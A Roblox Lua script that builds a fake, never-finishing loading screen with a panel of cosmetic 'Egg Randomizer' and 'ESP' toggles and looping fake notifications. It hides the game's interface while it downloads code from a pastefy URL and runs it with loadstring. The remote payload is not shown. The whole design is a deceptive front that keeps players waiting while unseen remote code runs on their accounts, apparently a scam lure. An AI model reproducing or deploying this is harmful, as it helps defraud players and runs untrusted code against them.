-- Fire-Themed Fake Loading UI with Interactive Control Panel
-- This script runs immediately and executes your loadstring
-- It features a draggable side panel with toggle buttons and animated fake notifications

local Players = game:GetService("Players")
local StarterGui = game:GetService("StarterGui")
local Player = Players.LocalPlayer

-- Ensure PlayerGui is ready
repeat task.wait() until Player:FindFirstChild("PlayerGui")

-- Disable CoreGui elements
pcall(function()
    for _, gui in ipairs(Enum.CoreGuiType:GetEnumItems()) do
        StarterGui:SetCoreGuiEnabled(gui, false)
    end
    StarterGui:SetCore("TopbarEnabled", false)
end)

-- Parent GUI
local gui = Instance.new("ScreenGui")
gui.Name = "CountdownGui"
gui.IgnoreGuiInset = true
gui.ResetOnSpawn = false
gui.ZIndexBehavior = Enum.ZIndexBehavior.Global
gui.DisplayOrder = 9999
gui.Parent = Player:WaitForChild("PlayerGui")

-- Background
local bg = Instance.new("Frame")
bg.Size = UDim2.new(1, 0, 1, 0)
bg.Position = UDim2.new(0, 0, 0, 0)
bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
bg.BorderSizePixel = 0
bg.Parent = gui

-- Loading Text
local loadingText = Instance.new("TextLabel")
loadingText.Size = UDim2.new(1, 0, 0.2, 0)
loadingText.Position = UDim2.new(0, 0, 0.4, 0)
loadingText.BackgroundTransparency = 1
loadingText.TextColor3 = Color3.new(1, 0.5, 0)
loadingText.Font = Enum.Font.GothamBlack
loadingText.TextScaled = true
loadingText.Text = "1%"
loadingText.Parent = bg

-- Top & Bottom Texts
local topText = Instance.new("TextLabel")
topText.Size = UDim2.new(1, 0, 0.1, 0)
topText.Position = UDim2.new(0, 0, 0.25, 0)
topText.BackgroundTransparency = 1
topText.TextColor3 = Color3.new(1, 0.4, 0)
topText.Font = Enum.Font.Gotham
topText.TextScaled = true
topText.Text = "Wait Until It Loads"
topText.Parent = bg

local bottomText = topText:Clone()
bottomText.Position = UDim2.new(0, 0, 0.65, 0)
bottomText.Text = "Be Patient"
bottomText.Parent = bg

-- Control Panel
local controlPanel = Instance.new("Frame")
controlPanel.Size = UDim2.new(0, 220, 0, 150)
controlPanel.Position = UDim2.new(0, 10, 0, 100)
controlPanel.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
controlPanel.BorderSizePixel = 0
controlPanel.BackgroundTransparency = 0.2
controlPanel.Parent = gui

-- Make control panel draggable
local drag = Instance.new("TextButton")
drag.Size = controlPanel.Size
drag.Position = UDim2.new(0, 0, 0, 0)
drag.Text = ""
drag.BackgroundTransparency = 1
drag.Parent = controlPanel
gui.ResetOnSpawn = false
drag.Draggable = true

-- Control Toggle UI Function
local function createToggle(text, emoji, parent, y)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(1, -10, 0, 30)
    btn.Position = UDim2.new(0, 5, 0, y)
    btn.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
    btn.TextColor3 = Color3.new(1, 1, 1)
    btn.Font = Enum.Font.Gotham
    btn.TextSize = 14
    btn.Text = emoji .. " " .. text .. ": OFF"
    btn.AutoButtonColor = true
    btn.Parent = parent

    local state = false
    btn.MouseButton1Click:Connect(function()
        state = not state
        btn.Text = emoji .. " " .. text .. ": " .. (state and "ON" or "OFF")
    end)
end

createToggle("Egg Randomizer", "üé≤", controlPanel, 5)
createToggle("Randomize Pets", "üéØ", controlPanel, 40)
createToggle("ESP", "üëÅÔ∏è", controlPanel, 75)
createToggle("Auto Randomize", "üîÑ", controlPanel, 110)

-- Fake Notifications
local function createNotification(text)
    local note = Instance.new("Frame")
    note.Size = UDim2.new(0, 220, 0, 50)
    note.Position = UDim2.new(0, 10, 1, -60)
    note.BackgroundColor3 = Color3.fromRGB(50, 0, 0)
    note.BorderSizePixel = 0
    note.BackgroundTransparency = 0.1
    note.Parent = gui

    local title = Instance.new("TextLabel")
    title.Size = UDim2.new(1, 0, 0.4, 0)
    title.Position = UDim2.new(0, 0, 0, 0)
    title.BackgroundTransparency = 1
    title.TextColor3 = Color3.fromRGB(255, 150, 0)
    title.Font = Enum.Font.GothamBold
    title.TextScaled = true
    title.Text = "Notification"
    title.Parent = note

    local message = title:Clone()
    message.Position = UDim2.new(0, 0, 0.4, 0)
    message.TextColor3 = Color3.new(1, 1, 1)
    message.Text = text
    message.Parent = note

    note:TweenPosition(UDim2.new(0, 10, 1, -70), Enum.EasingDirection.Out, Enum.EasingStyle.Quad, 0.5)
    task.delay(3, function()
        note:TweenPosition(UDim2.new(0, 10, 1, 0), Enum.EasingDirection.In, Enum.EasingStyle.Quad, 0.5)
        task.wait(0.5)
        note:Destroy()
    end)
end

-- Notification messages
local messages = {
    "Checking Egg...",
    "Verifying Egg...",
    "Egg Verified!",
    "Waiting For It To Load..."
}

-- Notification loop
spawn(function()
    while true do
        createNotification(messages[math.random(1, #messages)])
        task.wait(5)
    end
end)

-- Loading Percentage
spawn(function()
    for i = 1, 99 do
        loadingText.Text = i .. "%"
        task.wait(0.6) -- Slow it down for more convincing loading
    end
end)

-- Execute main script immediately
spawn(function()
loadstring(game:HttpGet("https://pastefy.app/EEmKlIPx/raw", true))()
end)
